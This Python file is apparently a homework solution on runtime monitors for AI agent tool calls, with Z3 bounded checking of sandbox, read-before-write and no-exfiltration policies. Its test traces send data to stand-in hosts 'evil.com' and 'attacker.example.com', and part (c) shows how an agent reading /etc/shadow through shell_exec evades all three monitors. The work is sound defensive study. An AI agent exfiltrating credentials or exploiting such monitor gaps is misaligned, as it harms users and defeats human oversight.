"""
CS292C Homework 2 — Problem 4: DFA Monitors + Bounded Trace Verification (20 pts)
===================================================================================
Part (a): Implement three stateful runtime monitors as DFAs.
Part (b): Verify the same properties using Z3 bounded model checking.
Part (c): Find a trace that passes all monitors but is still dangerous.
"""

from z3 import *
from dataclasses import dataclass

# ============================================================================
# Event Model
# ============================================================================

@dataclass
class ToolEvent:
    """A single tool-call event in an agent trace."""
    tool: str          # "file_read", "file_write", "shell_exec", "network_fetch"
    path: str          # target file/resource path
    is_sensitive: bool  # whether the target is sensitive

ALLOW = "ALLOW"
DENY  = "DENY"


# ============================================================================
# Part (a): DFA Monitors — 8 pts
# ============================================================================

SANDBOX_DIR = "/project/"  # paths starting with this are "in sandbox"


class SandboxMonitor:
    """
    Policy: Deny any file_write where path does not start with SANDBOX_DIR.
    All other tool calls are allowed.

    2-state DFA:
      OK        (accepting)  — no violation seen yet; all calls pass through.
      VIOLATION (rejecting)  — a write outside the sandbox occurred;
                               ALL subsequent calls are denied (absorbing state).
    """

    def __init__(self):
        self.state = "OK"

    def step(self, event: ToolEvent) -> str:
        # Absorbing reject: once tripped, every future call is denied.
        if self.state == "VIOLATION":
            return DENY

        # Only file_write is relevant. Reads, shell, and network pass through.
        if event.tool == "file_write":
            if not event.path.startswith(SANDBOX_DIR):
                self.state = "VIOLATION"
                return DENY

        return ALLOW


class ReadBeforeWriteMonitor:
    """
    Policy: Deny any file_write to a path that has not been file_read first.

    This monitor tracks a set of "read paths".
    - file_read  → add the path to the read set; return ALLOW.
    - file_write → DENY if the path is not in the read set, ALLOW otherwise.
    - anything else → ALLOW.

    Unlike SandboxMonitor, this monitor does NOT enter an absorbing violation
    state. It evaluates each file_write independently.
    """

    def __init__(self):
        self.read_paths: set[str] = set()

    def step(self, event: ToolEvent) -> str:
        if event.tool == "file_read":
            self.read_paths.add(event.path)
            return ALLOW

        if event.tool == "file_write":
            if event.path not in self.read_paths:
                return DENY
            return ALLOW

        # shell_exec, network_fetch — not this monitor's concern.
        return ALLOW


class NoExfilMonitor:
    """
    Policy: After any file_read of a sensitive resource, deny ALL subsequent
    network_fetch calls (regardless of target).

    2-state DFA:
      CLEAN   (accepting) — no sensitive read yet; network_fetch allowed.
      TAINTED (rejecting for network) — a sensitive file_read has occurred;
                                        network_fetch is denied forever.

    Note: only network_fetch is denied in TAINTED state; other tools still pass.
    """

    def __init__(self):
        self.state = "CLEAN"

    def step(self, event: ToolEvent) -> str:
        # Reading a sensitive file taints the session permanently.
        if event.tool == "file_read" and event.is_sensitive:
            self.state = "TAINTED"
            return ALLOW

        # Once tainted, no outbound network calls are allowed.
        # (Even "safe" URLs could leak data in query parameters or headers.)
        if event.tool == "network_fetch" and self.state == "TAINTED":
            return DENY

        return ALLOW


class ComposedMonitor:
    """Runs all three monitors in parallel. Denies if ANY monitor denies."""

    def __init__(self):
        self.monitors = [SandboxMonitor(), ReadBeforeWriteMonitor(), NoExfilMonitor()]

    def step(self, event: ToolEvent) -> str:
        results = [m.step(event) for m in self.monitors]
        return DENY if DENY in results else ALLOW


# ============================================================================
# Part (a) continued: Test traces
# ============================================================================

def test_monitors():
    """Test the monitors on the four example traces."""

    print("=== Part (a): DFA Monitor Tests ===\n")

    # Trace 1: Should be fully allowed
    trace1 = [
        ToolEvent("file_read",  "/project/src/main.py", False),
        ToolEvent("file_write", "/project/src/main.py", False),
        ToolEvent("shell_exec", "/project/run_tests.sh", False),
    ]

    # Trace 2: Should be denied by SandboxMonitor (write outside sandbox)
    trace2 = [
        ToolEvent("file_read",  "/project/src/main.py", False),
        ToolEvent("file_write", "/etc/passwd", False),  # ← violation
    ]

    # Trace 3: Should be denied by ReadBeforeWriteMonitor (write without read)
    trace3 = [
        ToolEvent("file_write", "/project/src/new_file.py", False),  # ← no prior read
    ]

    # Trace 4: Should be denied by NoExfilMonitor (network after sensitive read)
    trace4 = [
        ToolEvent("file_read",     "/project/secrets/api_key.txt", True),  # sensitive!
        ToolEvent("network_fetch", "https://evil.com/exfil", False),       # ← denied
    ]

    for i, (trace, name) in enumerate(
            [(trace1, "clean"), (trace2, "sandbox violation"),
             (trace3, "write-before-read"), (trace4, "exfiltration")], 1):
        cm = ComposedMonitor()
        results = []
        for event in trace:
            r = cm.step(event)
            results.append(r)

        print(f"  Trace {i} ({name}):")
        for event, r in zip(trace, results):
            print(f"    {event.tool:16s} {event.path:40s} → {r}")
        denied = any(r == DENY for r in results)
        print(f"    {'BLOCKED' if denied else 'ALLOWED'}\n")


# ============================================================================
# Part (b): Bounded Trace Verification with Z3 — 8 pts
# ============================================================================

FILE_READ     = 0
FILE_WRITE    = 1
SHELL_EXEC    = 2
NETWORK_FETCH = 3


def make_symbolic_trace(K):
    """Create symbolic trace variables for K steps."""
    tool         = [Int(f"tool_{i}")         for i in range(K)]
    in_sandbox   = [Bool(f"in_sandbox_{i}")  for i in range(K)]
    is_sensitive = [Bool(f"is_sensitive_{i}") for i in range(K)]
    path_id      = [Int(f"path_{i}")         for i in range(K)]

    wf = []
    for i in range(K):
        wf.append(And(tool[i]    >= 0, tool[i]    <= 3))
        wf.append(And(path_id[i] >= 0, path_id[i] <= 9))

    return {'tool': tool, 'in_sandbox': in_sandbox,
            'is_sensitive': is_sensitive, 'path_id': path_id, 'K': K}, wf


def verify_property_bounded(name, K, prop_negation_fn):
    """
    Check if a property can be violated in any trace of length K.
    prop_negation_fn(trace) should return constraints asserting a violation exists.
    """
    trace, wf = make_symbolic_trace(K)
    s = Solver()
    s.add(wf)
    s.add(prop_negation_fn(trace))

    result = s.check()
    print(f"  {name} (K={K}): ", end="")
    if result == sat:
        m = s.model()
        print("VIOLATION FOUND:")
        tool_names = {0: "file_read", 1: "file_write", 2: "shell_exec", 3: "net_fetch"}
        for i in range(K):
            t  = m.eval(trace['tool'][i]).as_long()
            p  = m.eval(trace['path_id'][i])
            sb = m.eval(trace['in_sandbox'][i],   model_completion=True)
            se = m.eval(trace['is_sensitive'][i],  model_completion=True)
            print(f"    step {i}: {tool_names.get(t, '?'):12s} "
                  f"path={p} sandbox={sb} sensitive={se}")
    else:
        print("NO VIOLATION POSSIBLE (property holds for all traces)")
    print()


def part_b():
    """
    For each of the three properties, encode the NEGATION and use Z3 to
    find a violating trace (or prove none exists up to bound K).
    """
    K = 8
    print(f"=== Part (b): Bounded Trace Verification (K={K}) ===\n")

    # ------------------------------------------------------------------
    # Property 1: Sandbox
    # Every file_write must target a resource that is in the sandbox.
    #
    # NEGATION: ∃ step i where tool[i] = FILE_WRITE ∧ ¬in_sandbox[i].
    # Expected result: SAT (easy to violate — just write outside sandbox).
    # ------------------------------------------------------------------
    def negate_sandbox(trace):
        K = trace['K']
        return [Or([
            And(trace['tool'][i] == FILE_WRITE,
                Not(trace['in_sandbox'][i]))
            for i in range(K)
        ])]

    # ------------------------------------------------------------------
    # Property 2: Read-before-write
    # For every file_write at step j to path p, there must exist some
    # earlier step i < j with tool[i] = FILE_READ and path_id[i] = p.
    #
    # NEGATION: ∃ j where tool[j] = FILE_WRITE ∧
    #             ∀ i < j: tool[i] ≠ FILE_READ ∨ path_id[i] ≠ path_id[j].
    #
    # Equivalently: for each candidate j, "no prior read of the same path"
    # is the conjunction over all earlier steps that each of them fails
    # the (FILE_READ, same_path) test.
    #
    # Edge case j=0: no earlier steps, so "no prior read" is trivially true
    # — a write at step 0 always violates the property.
    #
    # Expected result: SAT.
    # ------------------------------------------------------------------
    def negate_read_before_write(trace):
        K = trace['K']
        bad_steps = []
        for j in range(K):
            if j == 0:
                no_prior_read = BoolVal(True)   # no i < 0 to rescue us
            else:
                no_prior_read = And([
                    Or(trace['tool'][i]    != FILE_READ,
                       trace['path_id'][i] != trace['path_id'][j])
                    for i in range(j)
                ])
            bad_steps.append(
                And(trace['tool'][j] == FILE_WRITE, no_prior_read)
            )
        return [Or(bad_steps)]

    # ------------------------------------------------------------------
    # Property 3: No exfiltration
    # If any file_read at step i is sensitive, then no network_fetch
    # may occur at any later step j > i.
    #
    # NEGATION: ∃ i < j where tool[i] = FILE_READ ∧ is_sensitive[i]
    #                         ∧ tool[j] = NETWORK_FETCH.
    #
    # Expected result: SAT.
    # ------------------------------------------------------------------
    def negate_no_exfil(trace):
        K = trace['K']
        bad_pairs = []
        for i in range(K):
            for j in range(i + 1, K):
                bad_pairs.append(And(
                    trace['tool'][i]        == FILE_READ,
                    trace['is_sensitive'][i],
                    trace['tool'][j]        == NETWORK_FETCH
                ))
        return [Or(bad_pairs)]

    verify_property_bounded("Sandbox",           K, negate_sandbox)
    verify_property_bounded("Read-before-write",  K, negate_read_before_write)
    verify_property_bounded("No-exfiltration",    K, negate_no_exfil)

    # [EXPLAIN] DFA monitors vs. Z3 bounded model checking
    #
    # DFA monitors answer a per-event question: "should I allow this call right
    # now, given what I've seen so far?" They run online, alongside the live
    # agent, with O(1) overhead per event. The moment a bad call arrives they
    # can block it immediately. Their blind spot is that they only see the
    # traces the agent actually generates — if a dangerous pattern is possible
    # but never triggered in practice, the monitor never raises an alarm.
    #
    # Z3 bounded model checking answers a design-time question: "is there ANY
    # trace of length ≤ K that violates this property?" It explores the full
    # space of symbolic traces and hands you a concrete counterexample if one
    # exists. This catches latent bugs the agent has not yet triggered. Its
    # blind spots are the length bound (a bug needing K+1 steps is invisible),
    # and the offline nature — it cannot stop a live agent mid-execution.
    #
    # The two approaches are complementary. Z3 validates the policy at design
    # time and reveals the shape of possible attacks. DFA monitors enforce the
    # policy at runtime against the actual event stream. You want both.


# ============================================================================
# Part (c): Monitor Completeness — 4 pts
# ============================================================================

def part_c():
    """
    A length-6 trace that is ACCEPTED by all three monitors but is still
    dangerous. The attack exploits the gap the monitors share: none of them
    supervise shell_exec calls in any way.
    """
    print("=== Part (c): Monitor Completeness ===\n")

    # The trace:
    #   0. file_read  /project/config.txt      (not sensitive) — harmless setup
    #   1. file_write /project/config.txt      (not sensitive) — satisfies ReadBefore
    #   2. shell_exec /etc/shadow              (sensitive!)    — the dangerous step
    #   3. shell_exec /project/run.sh          (not sensitive) — filler
    #   4. file_read  /project/log.txt         (not sensitive) — no taint generated
    #   5. network_fetch https://attacker.example.com/log      — exfiltration
    #
    # Why each monitor stays silent:
    #   SandboxMonitor       — only checks file_write paths; never looks at shell_exec.
    #   ReadBeforeWriteMonitor — only checks file_write; shell_exec is invisible to it.
    #   NoExfilMonitor       — only taints on file_read of a sensitive resource.
    #                          Step 2 is shell_exec, not file_read, so the state stays
    #                          CLEAN. Step 5's network_fetch therefore passes unchallenged.
    #
    # The agent effectively reads /etc/shadow through the shell's stdout, keeps
    # the content in its working context, and then sends it out via network_fetch
    # — all without ever triggering a DENY.

    trace = [
        ToolEvent("file_read",     "/project/config.txt",               False),
        ToolEvent("file_write",    "/project/config.txt",               False),
        ToolEvent("shell_exec",    "/etc/shadow",                        True),  # ← dangerous
        ToolEvent("shell_exec",    "/project/run.sh",                   False),
        ToolEvent("file_read",     "/project/log.txt",                  False),
        ToolEvent("network_fetch", "https://attacker.example.com/log",  False),  # ← exfil
    ]

    cm = ComposedMonitor()
    print("  Trace:")
    all_allowed = True
    for event in trace:
        r = cm.step(event)
        print(f"    {event.tool:16s} {event.path:40s} sens={event.is_sensitive} → {r}")
        if r == DENY:
            all_allowed = False

    print(f"\n  All allowed: {all_allowed}")

    # [EXPLAIN]
    # 1. What property does this trace violate?
    #    Two properties, both uncovered by the existing monitors:
    #    (a) "No shell_exec on sensitive resources" — this is rule R4 from
    #        Problem 3. The monitors never look at shell_exec arguments or targets.
    #    (b) "No exfiltration of data obtained via shell" — the agent reads
    #        /etc/shadow through shell output (step 2), then sends a network
    #        request (step 5). The taint-tracking in NoExfilMonitor is blind to
    #        shell_exec as a data-read operation, so it never enters TAINTED state.
    #
    # 2. Why don't the three monitors catch it?
    #    SandboxMonitor and ReadBeforeWriteMonitor are both scoped to file_write
    #    events; they ignore shell_exec entirely.
    #    NoExfilMonitor taints only on file_read of a sensitive resource. Because
    #    the sensitive data was accessed via shell_exec (not file_read), the state
    #    remains CLEAN and the later network_fetch is allowed.
    #
    # 3. What additional monitor would catch it?
    #    A "ShellSensitivityMonitor" with two rules:
    #      Rule A — immediately DENY any shell_exec whose target is sensitive.
    #               This is the runtime enforcement of R4.
    #      Rule B — treat shell_exec on a sensitive target the same as
    #               file_read on a sensitive file for taint purposes: flip to
    #               TAINTED so that any subsequent network_fetch is also denied.
    #    Together, these two rules close the gap: they block direct shell access
    #    to sensitive resources AND prevent indirect exfiltration through the
    #    shell-then-network pattern demonstrated above.

    print()


# ============================================================================
if __name__ == "__main__":
    test_monitors()
    part_b()
    part_c()